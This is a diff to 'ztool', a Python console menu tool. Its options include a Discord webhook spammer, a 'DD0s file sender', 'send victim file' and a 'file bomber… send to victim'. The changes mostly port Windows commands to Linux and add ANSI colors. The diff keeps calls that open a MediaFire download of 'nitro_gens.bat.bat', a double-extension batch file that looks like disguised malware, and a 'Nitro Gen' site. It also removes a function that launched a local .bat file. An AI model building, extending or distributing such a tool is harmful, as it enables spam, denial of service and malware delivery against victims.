@@ -4,7 +4,7 @@ import time
 
 def main_menu():
     while True:
-        os.system('cls' if os.name == 'nt' else 'clear')
+        os.system('clear')
         print("==============================")
         print("            ztool              ")
         print("==============================")
@@ -13,10 +13,10 @@ def main_menu():
         print("3. IP Address Lookup")
         print("4. What's My IP?")
         print("5. DD0s file sender")
-        print("6. send victim file. spamming apps")
+        print("6. Send victim file. Spamming apps")
         print("7. Open Nitro Gen")
         print("8. Color Switch for GUI")
-        print("9. file bomber install and send to victim!!!")
+        print("9. File bomber install and send to victim!!!")
         print("0. Exit")
         print("==============================")
         
@@ -47,7 +47,7 @@ def main_menu():
             input("Press Enter to continue...")
 
 def webhook_spammer():
-    os.system('cls' if os.name == 'nt' else 'clear')
+    os.system('clear')
     print("==============================")
     print("        Discord Webhook Spammer")
     print("==============================")
@@ -74,7 +74,7 @@ def webhook_spammer():
     input("Press Enter to continue...")
 
 def webhook_deleter():
-    os.system('cls' if os.name == 'nt' else 'clear')
+    os.system('clear')
     print("==============================")
     print("        Delete Discord Webhook")
     print("==============================")
@@ -91,7 +91,7 @@ def webhook_deleter():
     input("Press Enter to continue...")
 
 def ip_lookup():
-    os.system('cls' if os.name == 'nt' else 'clear')
+    os.system('clear')
     print("==============================")
     print("        IP Address Lookup")
     print("==============================")
@@ -112,7 +112,7 @@ def ip_lookup():
     input("Press Enter to continue...")
 
 def what_is_my_ip():
-    os.system('cls' if os.name == 'nt' else 'clear')
+    os.system('clear')
     print("==============================")
     print("        What's My IP?")
     print("==============================")
@@ -127,7 +127,7 @@ def what_is_my_ip():
     input("Press Enter to continue...")
 
 def file_sender():
-    os.system('cls' if os.name == 'nt' else 'clear')
+    os.system('clear')
     print("==============================")
     print("        File Sender")
     print("==============================")
@@ -150,25 +150,25 @@ def file_sender():
     input("Press Enter to continue...")
 
 def open_link():
-    os.system('cls' if os.name == 'nt' else 'clear')
+    os.system('clear')
     print("==============================")
     print("        Open Link")
     print("==============================")
     print("Opening link: https://www.mediafire.com/file/vq2259ec6q0tkow/nitro_gens.bat.bat/file")
-    os.system('start https://www.mediafire.com/file/vq2259ec6q0tkow/nitro_gens.bat.bat/file')
+    os.system('xdg-open https://www.mediafire.com/file/vq2259ec6q0tkow/nitro_gens.bat.bat/file')
     input("Press Enter to continue...")
 
 def open_nitro_gen():
-    os.system('cls' if os.name == 'nt' else 'clear')
+    os.system('clear')
     print("==============================")
     print("        Open Nitro Gen")
     print("==============================")
     print("Opening Nitro Gen: https://nitro-gen-nine.vercel.app/")
-    os.system('start https://nitro-gen-nine.vercel.app/')
+    os.system('xdg-open https://nitro-gen-nine.vercel.app/')
     input("Press Enter to continue...")
 
 def color_switch():
-    os.system('cls' if os.name == 'nt' else 'clear')
+    os.system('clear')
     print("==============================")
     print("        Color Switch for GUI")
     print("==============================")
@@ -193,14 +193,29 @@ def color_switch():
     
     color_choice = input("Enter color choice (1-9, A-F, X): ").upper()
 
+    # ANSI escape sequences for colors
     colors = {
-        '1': '4', '2': '1', '3': '2', '4': '3', '5': '5', '6': '6', '7': '7', '8': '8',
-        '9': '9', 'A': 'A', 'B': 'B', 'C': 'C', 'D': 'D', 'E': 'E', 'F': 'F'
+        '1': '\033[91m',   # Red
+        '2': '\033[94m',   # Blue
+        '3': '\033[92m',   # Green
+        '4': '\033[96m',   # Turquoise
+        '5': '\033[95m',   # Magenta
+        '6': '\033[93m',   # Yellow
+        '7': '\033[97m',   # White
+        '8': '\033[90m',   # Grey
+        '9': '\033[94m',   # Light Blue
+        'A': '\033[92m',   # Light Green
+        'B': '\033[96m',   # Light Turquoise
+        'C': '\033[91m',   # Light Red
+        'D': '\033[95m',   # Light Magenta
+        'E': '\033[93m',   # Light Yellow
+        'F': '\033[97m'    # Light White
     }
 
+    reset_color = '\033[0m'  # Reset to default terminal color
+
     if color_choice in colors:
-        os.system(f'color {colors[color_choice]}')
-        print(f"Color changed to {color_choice}.")
+        print(f"{colors[color_choice]}Color changed to {color_choice}.{reset_color}")
     elif color_choice == 'X':
         rainbow_animation()
     else:
@@ -209,28 +224,19 @@ def color_switch():
     input("Press Enter to continue...")
 
 def rainbow_animation():
-    os.system('cls' if os.name == 'nt' else 'clear')
+    os.system('clear')
     print("==============================")
     print("        Rainbow Animation")
     print("==============================")
     print("Press Ctrl+C to stop the animation.")
-    chars = "\\|/-"
-    while True:
-        for char in chars:
-            for _ in range(15):
-                print(char, end='\r')
-                time.sleep(0.1)
-                chars = chars[1:] + chars[0]
-
-def install_file():
-    os.system('cls' if os.name == 'nt' else 'clear')
-    print("==============================")
-    print("        Install File")
-    print("==============================")
-    print("Installing file: C:\\Users\\Korbu\\Desktop\\surccecode.bat - Kopie800o - Kopie")
-    os.system('start "" "C:\\Users\\Korbu\\Desktop\\surccecode.bat - Kopie800o - Kopie"')
-    print("File installation started.")
-    input("Press Enter to continue...")
+    colors = ['\033[94m', '\033[92m', '\033[95m', '\033[35m', '\033[96m', '\033[93m', '\033[91m', '\033[97m']  # List of ANSI escape sequences for colors
+    try:
+        while True:
+            for color in colors:
+                print(f"{color}Colorful animation\033[0m", end='\r')
+                time.sleep(1)  # Change color every 1 second
+    except KeyboardInterrupt:
+        print("\nAnimation stopped.")
 
 if __name__ == "__main__":
     main_menu()
